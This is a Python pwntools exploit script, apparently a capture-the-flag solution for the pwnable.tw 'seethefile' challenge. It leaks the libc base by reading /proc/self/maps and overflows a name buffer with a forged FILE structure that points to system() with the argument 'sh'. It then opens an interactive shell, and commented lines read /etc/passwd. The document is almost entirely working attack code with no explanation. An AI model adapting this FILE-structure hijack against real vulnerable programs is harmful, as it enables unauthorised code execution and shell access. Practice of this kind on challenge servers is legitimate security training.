
from pwn import *
from ctypes import *
import pdb
import eventlet


def openfile(fname):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('What do you want to see :', fname)


def readfile():
    p.sendlineafter('Your choice :', '2')


def output():
    p.sendlineafter('Your choice :', '3')


def close():
    p.sendlineafter('Your choice :', '4')


def EXIT():
    p.sendlineafter('Your choice :', '5')


def leak_libc():
    openfile('/proc/self/maps')

    while True:
        readfile()
        output()
        # res = p.recvuntil('[heap]\n', drop=True, timeout=3)
        res = p.recvline_regex('^.*?r-xp.*?so$', timeout=3)
            
        if res:
            print(res)
            addr = int('0x'+res[:8], 16)
            break

    close()
    return addr


name_addr = 0x804B260


# p = process('/home/len/pwnable/seethefile')
# libc = ELF('/home/len/pwnable/libcs/glibc-2.23-x32/lib/libc-2.23.so')
p = remote('chall.pwnable.tw', 10200)
libc = ELF('/home/len/pwnable/libc_32.so.6')
# libc = p.libc

system_offset = libc.symbols['system']

if __name__ == "__main__":
    # f = FILE()
    # f._unused2 = chr(0)*0x28
    # # print(sizeof(FILE._vtable_jump))

    # print('system_addr: {:#x}'.format(libc_base + libc.symbols['system']))

    libc_base = leak_libc()
    print('libc_base: {:#x}'.format(libc_base))

    system_addr = libc_base + system_offset
    print('system_addr: {:#x}'.format(system_addr))

    # openfile('/etc/passwd')
    # readfile()
    # output()
    # EXIT()

    payload = [0, 0, system_addr, 0, 0, 0, 0, 0,
               name_addr+0x28, 0,
               u32('\x80\x80||'), u32('sh\x00\x00')
               ]

    # p.interactive()
    payload = flat(payload).ljust(0x28+0x94, '\x00')+p32(name_addr)
    p.sendlineafter('Your choice :', '5')
    pdb.set_trace()
    p.sendlineafter('Leave your name :', payload)
    

    # print(FILE._offset)
    print('done.')
    p.interactive()
